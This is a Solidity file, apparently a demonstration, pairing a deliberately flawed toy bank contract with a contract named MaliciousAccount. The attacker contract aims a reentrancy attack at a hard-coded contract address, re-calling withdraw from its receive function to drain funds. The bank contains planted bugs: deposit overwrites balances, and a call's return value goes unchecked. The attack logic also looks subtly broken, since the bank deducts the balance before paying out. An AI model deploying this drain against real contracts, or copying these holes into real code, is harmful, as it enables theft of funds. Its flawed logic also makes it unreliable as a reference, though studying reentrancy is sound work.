// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;


contract Web3Bank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);

        balances[msg.sender] -= amount;

        address(msg.sender).call{value: amount}("");
    }
}

contract MaliciousAccount {
    Web3Bank public bank = Web3Bank(0xc4cf578202460E46D46686A06d3194d9640c3B2d);
    uint256 public amount;
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function deposit() public payable {
        bank.deposit{value: msg.value}();
    }
    
    function withdraw(uint _amount) public {
        if (owner != msg.sender) return;

        amount = _amount;

        bank.withdraw(amount);
    }
    
    receive () external payable {
        if (address(bank).balance >= amount) {
            bank.withdraw(amount);
        }
    }
}